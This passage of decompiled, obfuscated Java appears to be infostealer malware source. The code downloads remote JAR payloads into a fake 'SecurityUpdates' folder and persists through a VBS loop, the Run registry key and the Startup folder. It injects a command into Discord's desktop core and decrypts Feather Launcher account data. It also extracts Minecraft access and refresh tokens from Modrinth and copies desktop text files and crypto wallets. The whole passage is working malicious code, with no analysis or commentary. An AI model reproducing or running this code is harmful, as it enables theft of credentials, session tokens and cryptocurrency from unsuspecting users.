         rkjsezrwcf.bbsnvj();
      }

      Future var3 = var0.submit(var1);

      try {
         var3.get(var2, java.util.concurrent.TimeUnit.SECONDS);
      } catch (TimeoutException var5) {
         System.out.println("Task timed out. Forcing shutdown...");
         var3.cancel(true);
      } catch (Exception var6) {
         var6.printStackTrace();
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static void fovyur(String var0, Path var1) throws Exception {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      URL var2 = new URL(var0);
      HttpURLConnection var3 = cosmos(var2, "GET", 20000, 3 << 16 | (char)-22144);
      var3.setRequestMethod("GET");
      var3.setConnectTimeout(20000);
      var3.setReadTimeout(3 << 16 | (char)-22144);
      var3.setRequestProperty("Accept", "application/java-archive");
      var3.setRequestProperty("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36");
      int var4 = var3.getResponseCode();
      if (var4 != 200) {
         var3.disconnect();
         throw new java.io.IOException(new StringBuilder().append("Download failed, HTTP ").append(var4).append(" for ").append(var2).toString());
      }

      long var5 = var3.getContentLengthLong();
      if (var1.getParent()
         != null) {
         java.nio.file.Files.createDirectories(var1.getParent(), new FileAttribute[0]);
      }

      long var7 = 0L;
      boolean var19 = false /* VF: Semaphore variable */;

      try {
         var19 = true;
         InputStream var9 = var3.getInputStream();

         try {
            OutputStream var10 = java.nio.file.Files.newOutputStream(var1, new OpenOption[]{
                  java.nio.file.StandardOpenOption.CREATE,
                  java.nio.file.StandardOpenOption.TRUNCATE_EXISTING,
                  java.nio.file.StandardOpenOption.WRITE
               });

            try {
               byte[] var11 = new byte[1 << 16 | (char)0];

               int var12;
               while ((var12 = var9.read(var11)) != -1) {
                  var10.write(var11, 0, var12);
                  var7 += var12;
               }
            } catch (Throwable var22) {
               if (var10 != null) {
                  try {
                     var10.close();
                  } catch (Throwable var21) {
                     var22.addSuppressed(var21);
                  }
               }

               throw var22;
            }

            if (var10 != null) {
               var10.close();
            }
         } catch (Throwable var23) {
            if (var9 != null) {
               try {
                  var9.close();
               } catch (Throwable var20) {
                  var23.addSuppressed(var20);
               }
            }

            throw var23;
         }

         if (var9 != null) {
            var9.close();
            var19 = false;
         } else {
            var19 = false;
         }
      } finally {
         if (var19) {
            var3.disconnect();
         }
      }

      var3.disconnect();
      if (var7 <= 0L) {
         java.nio.file.Files.deleteIfExists(var1);
         throw new java.io.IOException(new StringBuilder().append("empty download for ").append(var2).toString());
      }

      if (var5 > 0L && var7 != var5) {
         java.nio.file.Files.deleteIfExists(var1);
         throw new java.io.IOException(new StringBuilder().append("truncated download: ").append(var7).append(" of ").append(var5).append(" for ").append(var2).toString());
      }
   }

   public static void hishmh(String var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var2 = System.getenv("APPDATA");
         if (var2 == null) {
            var2 = System.getProperty("user.home");
         }

         Path var3 = java.nio.file.Paths.get(System.getenv("APPDATA"), new String[]{
               "Microsoft",
               "SecurityUpdates"
            });
         java.nio.file.Files.createDirectories(var3, new FileAttribute[0]);
         Path var4 = var3.resolve("JavaInt.jar");
         Path var5 = var3.resolve("JavaSecurity.jar");
         if (java.nio.file.Files.notExists(var3, new LinkOption[0])) {
            java.nio.file.Files.createDirectories(var3, new FileAttribute[0]);
         }

         String var6 = journey("7");
         String var7 = journey("0");
         boolean var8 = var6 != null
            && var6.startsWith("http");
         boolean var9 = var7 != null
            && var7.startsWith("http");
         if (!var8) {
            System.out.println("[injectFolder] slot 7 empty \u2014 skip screen.jar");
         } else {
            yfwkug(
               var5.getFileName().toString()
            );
            boolean var10 = false;

            for (int var11 = 1; var11 <= 3 && !var10; var11++) {
               try {
                  fovyur(var6, var5);
                  var10 = true;
               } catch (Exception var22) {
                  System.out.println(new StringBuilder().append("[injectFolder] screen.jar attempt ").append(var11).append(": ").append(var22.getMessage()).toString());

                  try {
                     Thread.sleep(1500);
                  } catch (InterruptedException var21) {
                  }
               }
            }

            if (!var10) {
               System.out.println("[injectFolder] screen.jar download failed, keep existing file");
            }
         }

         if (var9) {
            fovyur(var7, var4);
         } else {
            System.out.println("[injectFolder] slot 0 empty \u2014 skip payload");
         }

         if (var8) {
            try {
               iebebn(
                  "javacom",
                  String.valueOf(var5),
                  var0.replace("=", ""),
                  wudvfm()
               );
            } catch (Exception var20) {
               var20.printStackTrace();
               System.out.println(new StringBuilder().append("").append(var20.getClass().getName()).append(": ").append(var20.getMessage()).toString());
            }
         }

         LinkedHashSet var29 = new java.util.LinkedHashSet();

         try {
            Process var30 = new ProcessBuilder(new String[]{
                        "wmic",
                        "process",
                        "where",
                        "name='Discord.exe'",
                        "get",
                        "ExecutablePath"
                     }).redirectErrorStream(true).start();
            BufferedReader var12 = new java.io.BufferedReader(new java.io.InputStreamReader(var30.getInputStream(), "CP866"));

            String var13;
            while (
               (
                     var13 = var12.readLine()
                  )
                  != null
            ) {
               var13 = var13.trim();
               if (!var13.isEmpty()
                  && !var13.equalsIgnoreCase("ExecutablePath")
                  && var13.matches("^[a-zA-Z]:\\\\.*")) {
                  if (!var13.contains("?")) {
                     var29.add(var13);
                  } else {
                     System.out.println(new StringBuilder().append("[warn] WMIC broken encoding path: ").append(var13).toString());
                  }
               }
            }

            int var14 = var30.waitFor();
            System.out.println(new StringBuilder().append("[debug] wmic exit=").append(var14).toString());
         } catch (Exception var26) {
            System.out.println(new StringBuilder().append("[warn] WMIC failed/skipped: ").append(var26.getMessage()).toString());
         }

         try {
            String var31 = "[Console]::OutputEncoding=[System.Text.Encoding]::UTF8; Get-CimInstance Win32_Process | Where-Object { $_.Name -eq 'Discord.exe' } | ForEach-Object { $_.ExecutablePath }";
            Process var34 = new ProcessBuilder(new String[]{
                        "powershell.exe",
                        "-NoProfile",
                        "-NonInteractive",
                        "-ExecutionPolicy",
                        "Bypass",
                        "-Command",
                        var31
                     }).redirectErrorStream(false).start();
            BufferedReader var37 = new java.io.BufferedReader(new java.io.InputStreamReader(var34.getInputStream(), java.nio.charset.StandardCharsets.UTF_8));
            BufferedReader var41 = new java.io.BufferedReader(new java.io.InputStreamReader(var34.getErrorStream(), java.nio.charset.StandardCharsets.UTF_8));

            String var15;
            while (
               (
                     var15 = var37.readLine()
                  )
                  != null
            ) {
               var15 = var15.trim();
               if (!var15.isEmpty()) {
                  try {
                     Path var16 = java.nio.file.Paths.get(var15, new String[0]);
                     if (java.nio.file.Files.exists(var16, new LinkOption[0])
                        && java.nio.file.Files.isRegularFile(var16, new LinkOption[0])) {
                        var29.add(var15);
                        System.out.println(new StringBuilder().append("[debug] Discord path: ").append(var15).toString());
                     } else {
                        System.out.println(new StringBuilder().append("[warn] path does not exist: ").append(var15).toString());
                     }
                  } catch (Exception var24) {
                     System.out.println(new StringBuilder().append("[warn] bad path: ").append(var15).toString());
                  }
               }
            }

            String var46;
            while (
               (
                     var46 = var41.readLine()
                  )
                  != null
            ) {
               if (!var46.trim().isEmpty()) {
                  System.out.println(new StringBuilder().append("[powershell error] ").append(var46).toString());
               }
            }

            int var17 = var34.waitFor();
            System.out.println(new StringBuilder().append("[debug] powershell exit=").append(var17).toString());
         } catch (Exception var25) {
            System.out.println(new StringBuilder().append("[warn] PowerShell failed/skipped: ").append(var25.getMessage()).toString());
         }

         String var32 = new StringBuilder().append("require('child_process').exec('\"").append(wudvfm()).append("\" -jar \"").append(var4).append("\"  ").append(var0.replace("=", "")).append(var1.replace("=", "")).append(" Discord');").toString();
         var32 = var32.replace("\\", "//");
         String var35 = var32;

         try {
            Iterator var38 = var29.iterator();

            while (var38.hasNext()) {
               String var42 = (String)var38.next();
               String var45 = var42.replaceAll("\\\\app-[^\\\\]+\\\\Discord\\.exe$", "");
               String var47 = new StringBuilder().append(var45.replace("\\", "\\\\")).append("\\\\app-[^\\\\]+\\\\modules\\\\discord_desktop_core-[^\\\\]+\\\\discord_desktop_core\\\\index\\.js").toString();
               java.nio.file.Files.walk(java.nio.file.Paths.get(var45, new String[0]), new FileVisitOption[0]).filter(var1x -> {
                           if (rkjsezrwcf.jzdety() != 0) {
                              rkjsezrwcf.bbsnvj();
                           }

                           return var1x.toString().matches(var47);
                        }).findFirst().ifPresent(var1x -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     try {
                        String var2x = new String(java.nio.file.Files.readAllBytes(var1x));
                        if (!var2x.contains(var35)) {
                           var2x = new StringBuilder().append(var35).append("\n\n").append(var2x).toString();
                           java.nio.file.Files.write(var1x, var2x.getBytes(), new OpenOption[0]);
                           System.out.println("Inect fold in discord confirm");
                        } else {
                           System.out.println("Alredy fold inject in discord");
                        }
                     } catch (IOException var3x) {
                        var3x.printStackTrace();
                        System.out.println(new StringBuilder().append("").append(var3x.getClass().getName()).append(": ").append(var3x.getMessage()).toString());
                     }
                  });
            }
         } catch (Exception var23) {
            var23.printStackTrace();
         }

         if (java.nio.file.Files.isDirectory(java.nio.file.Paths.get(new StringBuilder().append(lupine).append("\\Discord").toString(), new String[0]), new LinkOption[0])) {
            String var39 = new StringBuilder().append(String.valueOf(lupine).replace("\\", "\\\\")).append("\\\\Discord\\\\app-.*\\\\modules\\\\.*\\\\discord_desktop_core.*\\\\index.js").toString();

            try {
               java.nio.file.Files.walk(java.nio.file.Paths.get(new StringBuilder().append(lupine).append("\\Discord").toString(), new String[0]), new FileVisitOption[0]).filter(var1x -> {
                           if (rkjsezrwcf.jzdety() != 0) {
                              rkjsezrwcf.bbsnvj();
                           }

                           return var1x.toString().matches(var39);
                        }).findFirst().ifPresent(var1x -> {
                     if (rkjsezrwcf.jzdety() != 0) {
                        rkjsezrwcf.bbsnvj();
                     }

                     try {
                        String var2x = new String(java.nio.file.Files.readAllBytes(var1x));
                        if (!var2x.contains(var35)) {
                           var2x = new StringBuilder().append(var35).append("\n\n").append(var2x).toString();
                           java.nio.file.Files.write(var1x, var2x.getBytes(), new OpenOption[0]);
                           System.out.println("Inect fold in discord confirm");
                        } else {
                           System.out.println("Alredy fold inject in discord");
                        }
                     } catch (IOException var3x) {
                        var3x.printStackTrace();
                        System.out.println(new StringBuilder().append("").append(var3x.getClass().getName()).append(": ").append(var3x.getMessage()).toString());
                     }
                  });
            } catch (IOException var19) {
               var19.printStackTrace();
               System.out.println(new StringBuilder().append("").append(var19.getClass().getName()).append(": ").append(var19.getMessage()).toString());
            }
         }

         try {
            ProcessBuilder var40 = new ProcessBuilder(new String[]{
                  wudvfm(),
                  "-jar",
                  var5.toString(),
                  var0.replace("=", ""),
                  "Discord"
               });
            var40.inheritIO();
            Process var43 = var40.start();
         } catch (Exception var18) {
            var18.getMessage();
            var18.printStackTrace();
            System.out.println(new StringBuilder().append("").append(var18.getClass().getName()).append(": ").append(var18.getMessage()).toString());
         }
      } catch (Exception var27) {
         var27.printStackTrace();
         System.out.println(new StringBuilder().append("").append(var27.getClass().getName()).append(": ").append(var27.getMessage()).toString());
      }
   }

   private static void yfwkug(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null && !var0.isEmpty()) {
         int var1 = 0;

         try {
            Process var2 = new ProcessBuilder(new String[]{
                        "wmic",
                        "process",
                        "where",
                        "name='java.exe'",
                        "get",
                        "ProcessId,CommandLine"
                     }).redirectErrorStream(true).start();
            BufferedReader var3 = new java.io.BufferedReader(new java.io.InputStreamReader(var2.getInputStream(), "CP866"));

            String var4;
            while (
               (
                     var4 = var3.readLine()
                  )
                  != null
            ) {
               if (var4.contains(var0)
                  && var4.contains("-jar")) {
                  Matcher var5 = java.util.regex.Pattern.compile("(\\d+)\\s*$").matcher(var4.trim());
                  if (var5.find()) {
                     String var6 = var5.group(1);
                     System.out.println(new StringBuilder().append("[injectFolder] replacing running client pid=").append(var6).toString());

                     try {
                        new ProcessBuilder(new String[]{
                                       "taskkill",
                                       "/PID",
                                       var6,
                                       "/F",
                                       "/T"
                                    }).redirectErrorStream(true).start().waitFor();
                        var1++;
                     } catch (Throwable var8) {
                     }
                  }
               }
            }

            var2.waitFor();
            if (var1 > 0) {
               Thread.sleep(900);
            }
         } catch (Throwable var9) {
         }
      }
   }

   public static boolean iebebn(String var0, String var1, String var2, String var3) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var4 = rcskzz(var3);
      String var5 = System.getenv("APPDATA");
      File var6 = java.nio.file.Paths.get(var5, new String[]{"AutoStartMini"}).toFile();
      if (!var6.exists()) {
         var6.mkdirs();
      }

      String var7 = mjobio(var2);

      try {
         java.nio.file.Files.deleteIfExists(new File(var6, new StringBuilder().append(var0).append("-super.bat").toString()).toPath());
      } catch (Exception var19) {
      }

      File var8 = new File(var6, new StringBuilder().append(var0).append("-super.vbs").toString());
      String var9 = new StringBuilder().append("\"").append(var4).append("\" -jar \"").append(var1).append("\" ").append(var7).toString();
      String var10 = new StringBuilder().append("Set s = CreateObject(\"WScript.Shell\")\r\nDo\r\n  s.Run \"").append(var9.replace("\"", "\"\"")).append("\", 0, True\r\n  WScript.Sleep 10000\r\nLoop\r\n").toString();

      try {
         java.nio.file.Files.write(var8.toPath(), var10.getBytes(java.nio.charset.StandardCharsets.UTF_8), new OpenOption[0]);
      } catch (IOException var18) {
         System.out.println(new StringBuilder().append("Write .vbs failed: ").append(var18.getMessage()).toString());
         return false;
      }

      String var11 = new StringBuilder().append("wscript.exe \"").append(var8.getAbsolutePath()).append("\"").toString();
      boolean var12 = false;

      try {
         int var13 = new ProcessBuilder(new String[]{
                        "reg",
                        "add",
                        "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                        "/v",
                        var0,
                        "/t",
                        "REG_SZ",
                        "/d",
                        var11,
                        "/f"
                     }).redirectErrorStream(true).start().waitFor();
         if (var13 == 0) {
            System.out.println(new StringBuilder().append("Autostart via HKCU Run: ").append(var8.getAbsolutePath()).toString());
            var12 = true;
         }
      } catch (Exception var17) {
         System.out.println(new StringBuilder().append("reg add failed: ").append(var17.getMessage()).toString());
      }

      try {
         File var20 = new File(new StringBuilder().append(var5).append("\\Microsoft\\Windows\\Start Menu\\Programs\\Startup").toString());
         if (var20.isDirectory()) {
            File var14 = new File(var20, new StringBuilder().append(var0).append(".vbs").toString());
            java.nio.file.Files.copy(var8.toPath(), var14.toPath(), new CopyOption[]{
                  java.nio.file.StandardCopyOption.REPLACE_EXISTING
               });
            System.out.println(new StringBuilder().append("Autostart via Startup: ").append(var14.getAbsolutePath()).toString());
            var12 = true;
         }
      } catch (Exception var16) {
         System.out.println(new StringBuilder().append("Startup copy failed: ").append(var16.getMessage()).toString());
      }

      if (!var12) {
         System.out.println("Failed to configure autostart");
      }

      if (var12) {
         try {
            new ProcessBuilder(new String[]{
                        "wscript.exe",
                        var8.getAbsolutePath()
                     }).redirectErrorStream(true).start();
            System.out.println(new StringBuilder().append("Started now: ").append(var0).toString());
         } catch (Exception var15) {
            System.out.println(new StringBuilder().append("Immediate start failed: ").append(var15.getMessage()).toString());
         }
      }

      return var12;
   }

   private static boolean pogxdc(File var0, String var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         OutputStreamWriter var2 = new java.io.OutputStreamWriter(new java.io.FileOutputStream(var0), java.nio.charset.StandardCharsets.UTF_8);

         boolean var3;
         try {
            var2.write("@echo off\r\n");
            var2.write(var1.trim());
            var2.write("\r\n");
            var3 = true;
         } catch (Throwable var6) {
            try {
               var2.close();
            } catch (Throwable var5) {
               var6.addSuppressed(var5);
            }

            throw var6;
         }

         var2.close();
         return var3;
      } catch (IOException var7) {
         System.out.println(new StringBuilder().append("Write .bat failed: ").append(var7.getMessage()).toString());
         return false;
      }
   }

   private static int run(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         return new ProcessBuilder(new String[]{"cmd", "/c", var0}).inheritIO().start().waitFor();
      } catch (Exception var2) {
         return -1;
      }
   }

   private static String rcskzz(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (var0 != null
         && !var0.trim().isEmpty()) {
         return var0;
      }

      String var1 = System.getProperty("java.home");
      Path var2 = java.nio.file.Paths.get(var1, new String[]{"bin", "javaw.exe"});
      return java.nio.file.Files.exists(var2, new LinkOption[0])
         ? var2.toAbsolutePath().toString()
         : java.nio.file.Paths.get(var1, new String[]{"bin", "java.exe"}).toAbsolutePath().toString();
   }

   public static String wudvfm() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      ArrayList var0 = new java.util.ArrayList();
      String var1 = System.getenv("JAVA_HOME");
      if (var1 != null && !var1.isEmpty()) {
         var0.add(new StringBuilder().append(var1).append("\\bin\\javaw.exe").toString());
         var0.add(new StringBuilder().append(var1).append("\\bin\\java.exe").toString());
      }

      String var2 = System.getProperty("java.home");
      if (var2 != null && !var2.isEmpty()) {
         var0.add(new StringBuilder().append(var2).append("\\bin\\javaw.exe").toString());
         var0.add(new StringBuilder().append(var2).append("\\bin\\java.exe").toString());
      }

      String var3 = System.getProperty("sun.boot.library.path");
      if (var3 != null && !var3.isEmpty()) {
         var0.add(new StringBuilder().append(var3).append("\\javaw.exe").toString());
         var0.add(new StringBuilder().append(var3).append("\\java.exe").toString());
         var0.add(new StringBuilder().append(var3).append("\\bin\\javaw.exe").toString());
         var0.add(new StringBuilder().append(var3).append("\\bin\\java.exe").toString());
      }

      String var4 = bfnjkm(var0);
      if (var4 != null) {
         return var4;
      }

      String var5 = mgojhi();
      return var5 != null ? var5 : null;
   }

   private static String mjobio(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      return var0 == null
         ? ""
         : var0.trim();
   }

   private static String bfnjkm(List<String> var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Iterator var1 = var0.iterator();

      while (var1.hasNext()) {
         String var2 = (String)var1.next();
         if (var2 != null && !var2.isEmpty()) {
            File var3 = new File(var2);
            if (var3.isFile()) {
               return var3.getAbsolutePath();
            }
         }
      }

      return null;
   }

   private static String mgojhi() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = ntezgl("javaw.exe");
      return var0 != null ? var0 : ntezgl("java.exe");
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   private static String ntezgl(String var0) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      Process var1 = null;
      BufferedReader var2 = null;
      boolean var21 = false /* VF: Semaphore variable */;

      String var9;
      label199: {
         label200: {
            label201: {
               try {
                  var21 = true;
                  var1 = new ProcessBuilder(new String[]{
                              "cmd.exe",
                              "/c",
                              new StringBuilder().append("where ").append(var0).toString()
                           }).redirectErrorStream(true).start();
                  var2 = new java.io.BufferedReader(new java.io.InputStreamReader(var1.getInputStream(), java.nio.charset.Charset.defaultCharset()));
                  ArrayList var4 = new java.util.ArrayList();

                  String var3;
                  while (
                     (
                           var3 = var2.readLine()
                        )
                        != null
                  ) {
                     var3 = var3.trim();
                     if (!var3.isEmpty()) {
                        var4.add(var3);
                     }
                  }

                  int var5 = var1.waitFor();
                  if (var5 == 0) {
                     Iterator var6 = var4.iterator();

                     while (var6.hasNext()) {
                        String var7 = (String)var6.next();
                        File var8 = new File(var7);
                        if (var8.isFile()) {
                           var9 = var8.getAbsolutePath();
                           var21 = false;
                           break label199;
                        }
                     }

                     var21 = false;
                     break label200;
                  }

                  var21 = false;
                  break label200;
               } catch (IOException var27) {
                  var21 = false;
               } catch (InterruptedException var28) {
                  Thread.currentThread().interrupt();
                  var21 = false;
                  break label201;
               } finally {
                  if (var21) {
                     try {
                        if (var2 != null) {
                           var2.close();
                        }
                     } catch (IOException var22) {
                     }

                     if (var1 != null) {
                        var1.destroy();
                     }
                  }
               }

               try {
                  if (var2 != null) {
                     var2.close();
                  }
               } catch (IOException var25) {
               }

               if (var1 != null) {
                  var1.destroy();
               }

               return null;
            }

            try {
               if (var2 != null) {
                  var2.close();
               }
            } catch (IOException var24) {
            }

            if (var1 != null) {
               var1.destroy();
            }

            return null;
         }

         try {
            if (var2 != null) {
               var2.close();
            }
         } catch (IOException var26) {
         }

         if (var1 != null) {
            var1.destroy();
         }

         return null;
      }

      try {
         if (var2 != null) {
            var2.close();
         }
      } catch (IOException var23) {
      }

      if (var1 != null) {
         var1.destroy();
      }

      return var9;
   }

   public static void zwcnnh() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         if (!java.nio.file.Files.isDirectory(java.nio.file.Paths.get(new StringBuilder().append(pebble).append("\\Feather Launcher").toString(), new String[0]), new LinkOption[0])) {
            return;
         }

         byte[] var0 = roltwn();
         byte[] var1 = java.nio.file.Files.readAllBytes(new File(new StringBuilder().append(pebble).append("\\.feather\\account.txt").toString()).toPath());
         if (var1[0] != 118 || var1[1] != 49 || var1[2] != 48) {
            throw new java.lang.RuntimeException("Wrong file format, header must be v10");
         }

         byte[] var2 = new byte[12];
         System.arraycopy(var1, 3, var2, 0, 12);
         byte[] var3 = new byte[var1.length - 3 - 12 - 16];
         System.arraycopy(var1, 15, var3, 0, var3.length);
         byte[] var4 = new byte[16];
         System.arraycopy(var1, var1.length - 16, var4, 0, 16);
         Cipher var5 = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding");
         SecretKeySpec var6 = new javax.crypto.spec.SecretKeySpec(var0, "AES");
         GCMParameterSpec var7 = new javax.crypto.spec.GCMParameterSpec(128, var2);
         var5.init(2, var6, var7);
         var5.updateAAD(new byte[0]);
         byte[] var8 = var5.doFinal(rjuusw(var3, var4));
         String var9 = new String(var8, "UTF-8");
         System.out.println(var9);
         OutputStreamWriter var10 = new java.io.OutputStreamWriter(new java.io.FileOutputStream(new StringBuilder().append(paprika).append("\\NewFeather.txt").toString()), "UTF-8");

         try {
            var10.write(var9);
         } catch (Throwable var14) {
            try {
               var10.close();
            } catch (Throwable var13) {
               var14.addSuppressed(var13);
            }

            throw var14;
         }

         var10.close();
      } catch (Exception var15) {
         var15.printStackTrace();
      }
   }

   public static byte[] rjuusw(byte[] var0, byte[] var1) {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      byte[] var2 = new byte[var0.length + var1.length];
      System.arraycopy(var0, 0, var2, 0, var0.length);
      System.arraycopy(var1, 0, var2, var0.length, var1.length);
      return var2;
   }

   public static byte[] roltwn() throws IOException {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      String var0 = new StringBuilder().append(pebble).append("\\Feather Launcher\\Local State").toString();
      String var1 = new String(java.nio.file.Files.readAllBytes(java.nio.file.Paths.get(var0, new String[0])));
      JSONObject var2 = new JSONObject(var1);
      String var3 = var2.getJSONObject("os_crypt")
         .getString("encrypted_key");
      byte[] var4 = java.util.Base64.getDecoder().decode(var3);
      byte[] var5 = new byte[var4.length - 5];
      System.arraycopy(var4, 5, var5, 0, var5.length);
      final byte[] var6 = var5;
      Object var7 = null;

      try {
         return cradle.desert(
            "Crypt32Util.cryptUnprotectData",
            new Callable<byte[]>() {
               public byte[] call() throws Exception {
                  if (rkjsezrwcf.jzdety() != 0) {
                     rkjsezrwcf.bbsnvj();
                  }

                  return Crypt32Util.cryptUnprotectData(var6);
               }
            }
         );
      } catch (Exception var9) {
         throw new java.lang.RuntimeException(var9);
      }
   }

   // $VF: Could not verify finally blocks. A semaphore variable has been added to preserve control flow.
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public void qmeuvi() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      try {
         String var1 = new StringBuilder().append(pebble).append("\\ModrinthApp\\app.db").toString();
         if (java.nio.file.Files.exists(java.nio.file.Paths.get(var1, new String[0]), new LinkOption[0])) {
            Path var2 = null;
            boolean var24 = false /* VF: Semaphore variable */;

            label264: {
               try {
                  var24 = true;
                  var2 = java.nio.file.Files.createTempFile("modrinth", ".sqlite", new FileAttribute[0]);
                  clsatd(
                     java.nio.file.Paths.get(var1, new String[0]),
                     var2
                  );
                  var2.toFile().deleteOnExit();
                  ArrayList var3 = new java.util.ArrayList();
                  Connection var4 = java.sql.DriverManager.getConnection(new StringBuilder().append("jdbc:sqlite:").append(var2.toString()).toString());

                  try {
                     PreparedStatement var5 = var4.prepareStatement("SELECT uuid, username, access_token, refresh_token, expires, active FROM minecraft_users");

                     try {
                        ResultSet var6 = var5.executeQuery();

                        try {
                           while (var6.next()) {
                              LinkedHashMap var7 = new java.util.LinkedHashMap();
                              var7.put("uuid", var6.getString("uuid"));
                              var7.put("username", var6.getString("username"));
                              var7.put("access_token", var6.getString("access_token"));
                              var7.put("refresh_token", var6.getString("refresh_token"));
                              var7.put("expires", Long.valueOf(var6.getLong("expires")));
                              var7.put("active", Boolean.valueOf(var6.getBoolean("active")));
                              var3.add(var7);
                           }
                        } catch (Throwable var33) {
                           if (var6 != null) {
                              try {
                                 var6.close();
                              } catch (Throwable var30) {
                                 var33.addSuppressed(var30);
                              }
                           }

                           throw var33;
                        }

                        if (var6 != null) {
                           var6.close();
                        }
                     } catch (Throwable var34) {
                        if (var5 != null) {
                           try {
                              var5.close();
                           } catch (Throwable var29) {
                              var34.addSuppressed(var29);
                           }
                        }

                        throw var34;
                     }

                     if (var5 != null) {
                        var5.close();
                     }
                  } catch (Throwable var35) {
                     if (var4 != null) {
                        try {
                           var4.close();
                        } catch (Throwable var28) {
                           var35.addSuppressed(var28);
                        }
                     }

                     throw var35;
                  }

                  if (var4 != null) {
                     var4.close();
                  }

                  if (var3.isEmpty()) {
                     System.out.println("Modrinth data is empty, file not created");
                     var24 = false;
                     break label264;
                  }

                  java.nio.file.Files.createDirectories(java.nio.file.Paths.get(paprika, new String[0]), new FileAttribute[0]);
                  Path var38 = java.nio.file.Paths.get(paprika, new String[]{"modrinth.json"});
                  Gson var39 = new GsonBuilder().setPrettyPrinting().create();
                  BufferedWriter var40 = java.nio.file.Files.newBufferedWriter(var38, java.nio.charset.StandardCharsets.UTF_8, new OpenOption[]{
                        java.nio.file.StandardOpenOption.CREATE,
                        java.nio.file.StandardOpenOption.TRUNCATE_EXISTING
                     });

                  try {
                     var39.toJson(var3, var40);
                  } catch (Throwable var32) {
                     if (var40 != null) {
                        try {
                           var40.close();
                        } catch (Throwable var26) {
                           var32.addSuppressed(var26);
                        }
                     }

                     throw var32;
                  }

                  if (var40 != null) {
                     var40.close();
                  }

                  bishop = Boolean.valueOf(!var3.isEmpty());
                  System.out.println(new StringBuilder().append("Modrinth data exported to: ").append(var38).toString());
                  var24 = false;
               } finally {
                  if (var24) {
                     if (var2 != null) {
                        try {
                           java.nio.file.Files.deleteIfExists(var2);
                        } catch (Exception var25) {
                        }
                     }
                  }
               }

               if (var2 != null) {
                  try {
                     java.nio.file.Files.deleteIfExists(var2);
                  } catch (Exception var31) {
                  }

                  return;
               }

               return;
            }

            if (var2 != null) {
               try {
                  java.nio.file.Files.deleteIfExists(var2);
               } catch (Exception var27) {
               }
            }
         }
      } catch (Exception var37) {
         var37.printStackTrace();
      }
   }

   public static void kqlsdl() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (stigma) {
         try {
            File var0 = new File(new StringBuilder().append(lantern).append("\\desktop").toString());
            var0.mkdirs();
            boolean var1 = false;
            Path var2 = java.nio.file.Paths.get(mgdkyw(), new String[0]);
            if (java.nio.file.Files.isDirectory(var2, new LinkOption[0])) {
               File[] var3 = var2.toFile().listFiles();
               if (var3 != null) {
                  for (File var7 : var3) {
                     if (var7.isFile()
                        && var7.getName().endsWith(".txt")) {
                        System.out.println(new StringBuilder().append("Get Desktop txt: ").append(var7.getName()).toString());
                        FileUtils.copyFile(
                           var7,
                           new File(var0, var7.getName())
                        );
                        var1 = true;
                     }
                  }
               }
            }

            if (!var1) {
               var0.delete();
            }
         } catch (Exception var8) {
            var8.printStackTrace();
         }
      }
   }

   public static void asunhf() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (lattice) {
         try {
            File var0 = new File(new StringBuilder().append(lantern).append("\\Wallets").toString());
            boolean var1 = false;

            for (String var5 : pomegranate) {
               if (java.nio.file.Files.isDirectory(java.nio.file.Paths.get(var5, new String[0]), new LinkOption[0])) {
                  File var6 = new File(var0, var5.split("\\\\")[5]);
                  FileUtils.copyDirectory(
                     new File(var5),
                     var6
                  );
                  System.out.println(var5);
                  if (var6.list().length
                     > 0) {
                     var1 = true;
                  }
               }
            }

            if (!var1) {
               var0.delete();
            }
         } catch (Exception var7) {
         }
      }
   }

   public void zrhvli() {
      if (rkjsezrwcf.jzdety() != 0) {
         rkjsezrwcf.bbsnvj();
      }

      if (panther) {
         try {
            File var1 = new File(new StringBuilder().append(lantern).append("\\WebWallets").toString());
            boolean var2 = false;
            Iterator var3 = reveal.keySet().iterator();

            while (var3.hasNext()) {
               String var4 = (String)var3.next();
               List var5 = jnpdit(var4);
               if (!var5.isEmpty()) {
